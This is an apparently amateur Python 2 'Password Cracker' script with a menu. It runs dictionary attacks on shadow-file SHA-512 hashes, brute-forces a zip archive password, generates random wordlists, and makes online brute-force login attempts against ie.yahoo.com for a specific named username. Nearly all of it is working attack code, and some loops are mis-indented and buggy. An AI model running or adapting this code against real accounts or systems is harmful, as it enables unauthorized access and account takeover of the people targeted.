import crypt, sys, string, random, re, urllib, urllib2, zipfile
class switch(object):
    def __init__(self, value):
        self.value = value
        self.fall = False

    def __iter__(self):
        """Return the match method once, then stop"""
        yield self.match
        raise StopIteration
    
    def match(self, *args):
        """Indicate whether or not to enter a case suite"""
        if self.fall or not args:
            return True
        elif self.value in args: # changed for v1.5, see below
            self.fall = True
            return True
        else:
            return False

print "Welcome to the Password Cracker"
print "1) To crack a user password."
print "2) To crack a zip file password."
print "3) To crack a website password."
print "4) To create a custom wordlist."
print "5) To quit the program."
choice=raw_input("Please enter the function of your choice: ")

for case in switch(choice):
    if case('1'):
	print "You chose to crack a user password."
	print "Please make sure you have root access before running this program."
	pfile=raw_input("Please enter the password file: ")
	dfile=raw_input("Please enter the dictionary file you wish to use: ")
	passfile=open(pfile, "r")
	dictfile=open(dfile, "r")

	for line in passfile.readlines():
	   if ":" in line:
		user=line.split(':')[0]
		password=line.split(':')[1].strip(' ')
		salt=password.split('$')[2]
		salt="$6$"+salt
		print "Cracking password for: "+user
	   for word in dictfile.readlines():
   	      word=word.replace('\n', '')
	      encryptedword=crypt.crypt(word, salt)
	      if (encryptedword == password):
	         print "Found password for "+user+": "+word
		 dictfile.seek(0)
	     
	break
    if case('2'):
        print "You chose to crack a zip file password."
	zFile=zipfile.ZipFile('PasswordCracker.zip')
	passFile=open('password.txt', "r")
	for line in passFile.readlines():
	   password=line.strip('\n')
	   try:
		zFile.extractall(pwd=password)
		print "Password= "+password+"\n"
	   except Exception, e:
		pass
	break
    if case('3'):
	print "You chose to crack a website password."
	host="http://ie.yahoo.com"
	usr="caffreyblack"
	website=urllib2.HTTPHandler(host)
	wl="password.txt"
	badLogin="error_invalid_auth"
	words=open(wl, "r").readlines()
	print "Words loaded: ", len(words)
	
	for word in words:
	   word=word.replace("\n","")
	   loginSequence=[('username',usr),('password',word)]
	   loginData=urllib.urlencode(loginSequence)
	   opener=urllib2.build_opener(website)
	   opener.addheaders=[('User-agent', 'Mozilla/5.0')]
	   source=opener.open(host,loginData).read()
	   if re.search(badLogin,source)==None:
		print "Successful Login: ",usr, word
	break
    if case('4'):
	print "You chose to create a custom wordlist."
	minimum=input("Please enter the minimum length of words to be created: ")
	maximum=input("Please enter the maximum length of words to be created: ")
	wordMax=input("Please enter the max number of words to be created: ")
	
	alphabet=string.letters[0:52]+string.digits+string.punctuation
	word=''
	wordlist=open("wordlist.txt", "w+")
	for count in xrange(0, wordMax):
	    for x in random.sample(alphabet, random.randint(minimum, maximum)):
		word+=x
	    wordlist.write(word+'\n')
	    word=''
	wordlist.close()
	break
    if case('5'):
	print "You chose to quit the program."
	sys.exit()
    if case():
	print "Invalid choice"
